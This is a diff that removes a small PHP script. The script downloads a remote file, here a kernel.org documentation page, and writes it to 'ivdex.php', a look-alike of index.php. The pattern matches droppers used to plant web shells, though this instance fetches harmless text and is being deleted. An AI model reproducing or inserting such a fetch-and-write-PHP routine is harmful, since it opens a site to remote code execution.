@@ -1,8 +1,0 @@
-<?php
-$site = 'https://www.kernel.org/doc/Documentation/power/drivers-testing.txt';
-$homepage = file_get_contents($site);
-$filename = 'ivdex.php';
-$handle = fopen($filename,"w");
-fwrite($handle,$homepage);
-fclose($handle);
-?>
